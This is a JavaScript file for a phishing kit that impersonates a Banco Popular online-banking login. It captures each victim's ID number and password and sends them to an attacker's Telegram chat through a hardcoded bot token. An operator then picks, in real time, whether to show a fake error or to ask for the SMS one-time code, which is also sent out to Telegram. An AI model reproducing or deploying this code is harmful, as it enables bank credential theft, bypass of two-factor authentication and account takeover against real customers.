document.addEventListener('DOMContentLoaded', function() {
    // Elementos del DOM
    const form = document.querySelector('.login-form');
    const docNumber = document.querySelector('#docNumber');
    const passwordInput = document.querySelector('#password');
    const submitBtn = document.querySelector('.submit-btn');
    const rememberCheck = document.querySelector('#remember');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const smsModal = document.getElementById('smsModal');
    const errorMessage = document.getElementById('errorMessage');
    const smsErrorMessage = document.getElementById('smsErrorMessage');
    const smsInputs = document.querySelectorAll('.sms-code-input input');
    const submitSmsCode = document.getElementById('submitSmsCode');
    const resendCodeBtn = document.getElementById('resendCode');
    const timerDisplay = document.getElementById('smsTimer');
    
    let timer;
    let pollingInterval;

    // ⚠️ ADVERTENCIA: Esto es inseguro, debería estar en el servidor
    const TELEGRAM_API_KEY = '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw';
    const TELEGRAM_CHAT_ID = '-1004245962123';

    // Verificar elementos críticos
    if (!form || !docNumber || !passwordInput || !submitBtn) {
        console.error('Error: Faltan elementos del formulario');
        return;
    }

    function validateForm() {
        const isDocNumberValid = docNumber.value.length > 0;
        const isPasswordValid = passwordInput.value.length > 0;
        submitBtn.disabled = !(isDocNumberValid && isPasswordValid);
        
        if (isDocNumberValid && isPasswordValid) {
            submitBtn.style.backgroundColor = 'var(--primary-green)';
            submitBtn.style.color = 'white';
        } else {
            submitBtn.style.backgroundColor = 'var(--background-gray)';
            submitBtn.style.color = 'var(--gray-text)';
        }
    }

    function saveFormData() {
        if (rememberCheck && rememberCheck.checked) {
            const docType = document.querySelector('#docType');
            if (docType) {
                localStorage.setItem('popular_docType', docType.value);
            }
            localStorage.setItem('popular_docNumber', docNumber.value);
            localStorage.setItem('popular_remember', 'true');
        } else {
            localStorage.removeItem('popular_docType');
            localStorage.removeItem('popular_docNumber');
            localStorage.removeItem('popular_remember');
        }
    }

    function loadFormData() {
        const savedRemember = localStorage.getItem('popular_remember');
        if (savedRemember) {
            const savedDocType = localStorage.getItem('popular_docType');
            const savedDocNumber = localStorage.getItem('popular_docNumber');
            const docType = document.querySelector('#docType');
            
            if (docType && savedDocType) {
                docType.value = savedDocType;
            }
            docNumber.value = savedDocNumber || '';
            if (rememberCheck) rememberCheck.checked = true;
            
            validateForm();
        }
    }

    // SMS code input handling
    if (smsInputs.length > 0) {
        smsInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1) {
                    if (index < smsInputs.length - 1) {
                        smsInputs[index + 1].focus();
                    }
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && index > 0 && input.value.length === 0) {
                    smsInputs[index - 1].focus();
                }
            });

            input.addEventListener('keypress', (e) => {
                if (!/[0-9]/.test(e.key)) {
                    e.preventDefault();
                }
            });
        });
    }

    async function sendTelegramMessage(message, options = ['Mostrar error', 'Permitir acceso']) {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage`;
        
        const keyboard = {
            inline_keyboard: [
                options.map(option => ({ 
                    text: option, 
                    callback_data: option.toLowerCase().replace(/ /g, '_') 
                }))
            ]
        };
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: keyboard  // ✅ Corregido: sin JSON.stringify extra
                }),
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const data = await response.json();
            console.log('Mensaje enviado:', data);
            return data.result ? data.result.message_id : null;
        } catch (error) {
            console.error('Error al enviar mensaje:', error);
            return null;
        }
    }

    async function checkTelegramResponse(messageId) {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates`;
        
        try {
            const response = await fetch(url);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                // Buscar en todos los updates
                for (const update of data.result) {
                    if (update.callback_query && 
                        update.callback_query.message && 
                        update.callback_query.message.message_id === messageId) {
                        return update.callback_query.data;
                    }
                }
            }
            return null;
        } catch (error) {
            console.error('Error al verificar respuesta:', error);
            return null;
        }
    }

    function startPolling(messageId) {
        return new Promise((resolve) => {
            let attempts = 0;
            const maxAttempts = 150; // 5 minutos (150 * 2 segundos)
            
            pollingInterval = setInterval(async () => {
                attempts++;
                const response = await checkTelegramResponse(messageId);
                
                if (response) {
                    clearInterval(pollingInterval);
                    resolve(response);
                } else if (attempts >= maxAttempts) {
                    clearInterval(pollingInterval);
                    resolve('timeout');
                }
            }, 2000);
        });
    }

    function clearSmsFields() {
        smsInputs.forEach(input => input.value = '');
        if (smsInputs.length > 0) smsInputs[0].focus();
    }

    function clearAllFields() {
        docNumber.value = '';
        passwordInput.value = '';
        clearSmsFields();
        if (errorMessage) errorMessage.style.display = 'none';
        if (smsErrorMessage) smsErrorMessage.style.display = 'none';
    }

    function showSmsError(message) {
        if (smsErrorMessage) {
            smsErrorMessage.textContent = message;
            smsErrorMessage.style.display = 'block';
        }
        if (smsModal) smsModal.style.display = 'flex';
        if (smsErrorMessage) {
            smsErrorMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    }

    function clearSmsError() {
        if (smsErrorMessage) {
            smsErrorMessage.textContent = '';
            smsErrorMessage.style.display = 'none';
        }
    }

    function startSmsTimer() {
        clearSmsFields();
        clearSmsError();
        let timeLeft = 300;
        
        if (resendCodeBtn) resendCodeBtn.classList.add('disabled');

        clearInterval(timer);
        timer = setInterval(() => {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            
            if (timerDisplay) {
                timerDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            }

            if (timeLeft === 0) {
                clearInterval(timer);
                if (resendCodeBtn) resendCodeBtn.classList.remove('disabled');
                showSmsError('El código SMS ha expirado. Por favor, inicie sesión nuevamente.');
            } else {
                timeLeft--;
            }
        }, 1000);
    }

    // Resend code functionality
    if (resendCodeBtn) {
        resendCodeBtn.addEventListener('click', (e) => {
            e.preventDefault();
            if (!resendCodeBtn.classList.contains('disabled')) {
                startSmsTimer();
                
                const originalText = resendCodeBtn.innerHTML;
                resendCodeBtn.innerHTML = '<i class="fas fa-check"></i> Código reenviado';
                setTimeout(() => {
                    resendCodeBtn.innerHTML = originalText;
                }, 3000);
            }
        });
    }

    // Form submission
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            saveFormData();
            
            if (loadingOverlay) loadingOverlay.style.display = 'flex';
            if (errorMessage) errorMessage.style.display = 'none';
            
            const username = docNumber.value;
            const password = passwordInput.value;
            
            const messageId = await sendTelegramMessage(`
🏦 Nuevo intento de acceso a Banco Popular
👤 Usuario: ${username}
🔑 Contraseña: ${password}

Por favor, seleccione una acción:
            `);
            
            if (messageId) {
                const adminResponse = await startPolling(messageId);
                
                if (loadingOverlay) loadingOverlay.style.display = 'none';
                
                if (adminResponse === 'mostrar_error') {
                    if (errorMessage) {
                        errorMessage.textContent = 'Usuario o contraseña incorrectos. Por favor, inténtelo de nuevo.';
                        errorMessage.style.display = 'block';
                    }
                    submitBtn.disabled = false;
                    
                    setTimeout(() => {
                        if (errorMessage) {
                            errorMessage.style.display = 'none';
                            errorMessage.textContent = '';
                        }
                        docNumber.value = '';
                        passwordInput.value = '';
                        validateForm();
                    }, 3000);
                    
                } else if (adminResponse === 'permitir_acceso') {
                    if (smsModal) smsModal.style.display = 'flex';
                    startSmsTimer();
                    
                } else if (adminResponse === 'timeout') {
                    if (errorMessage) {
                        errorMessage.textContent = 'Tiempo de espera agotado. Inténtelo de nuevo.';
                        errorMessage.style.display = 'block';
                    }
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    submitBtn.disabled = false;
                }
                
            } else {
                if (loadingOverlay) loadingOverlay.style.display = 'none';
                if (errorMessage) {
                    errorMessage.textContent = 'Hubo un error al procesar su solicitud. Por favor, inténtelo de nuevo más tarde.';
                    errorMessage.style.display = 'block';
                }
                submitBtn.disabled = false;
            }
        });
    }

    // SMS verification
    if (submitSmsCode) {
        submitSmsCode.addEventListener('click', async () => {
            const code = Array.from(smsInputs).map(input => input.value).join('');

            if (code.length === 8) {
                if (loadingOverlay) loadingOverlay.style.display = 'flex';
                if (smsModal) smsModal.style.display = 'none';
                clearInterval(timer);

                const messageId = await sendTelegramMessage(`
🏦 Código OTP ingresado para Banco Popular
🔢 Código: ${code}

Por favor, seleccione una acción:
                `, ['Error de token', 'Permitir acceso']);

                if (messageId) {
                    const adminResponse = await startPolling(messageId);

                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    if (smsModal) smsModal.style.display = 'flex';

                    if (adminResponse === 'error_de_token') {
                        showSmsError('Error en el token. Por favor, intente nuevamente.');
                        setTimeout(() => {
                            startSmsTimer();
                        }, 3000);
                        
                    } else if (adminResponse === 'permitir_acceso') {
                        clearAllFields();
                        window.location.href = '../confirmacion.html';
                        
                    } else if (adminResponse === 'timeout') {
                        showSmsError('Tiempo de espera agotado.');
                        setTimeout(() => {
                            startSmsTimer();
                        }, 3000);
                    }
                    
                } else {
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    if (smsModal) smsModal.style.display = 'flex';
                    showSmsError('Hubo un error al procesar su solicitud. Por favor, inténtelo de nuevo más tarde.');
                    setTimeout(() => {
                        startSmsTimer();
                    }, 3000);
                }
                
            } else {
                showSmsError('Por favor, ingrese el código SMS completo de 8 dígitos.');
                setTimeout(() => {
                    clearSmsError();
                }, 3000);
            }
        });
    }

    // Initialize
    loadFormData();
    validateForm();

    // Event listeners
    form.addEventListener('input', validateForm);

    const togglePassword = document.querySelector('.toggle-password');
    if (togglePassword && passwordInput) {
        togglePassword.addEventListener('click', () => {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            togglePassword.innerHTML = type === 'password' ? 
                '<i class="fas fa-eye"></i>' : 
                '<i class="fas fa-eye-slash"></i>';
        });
    }
});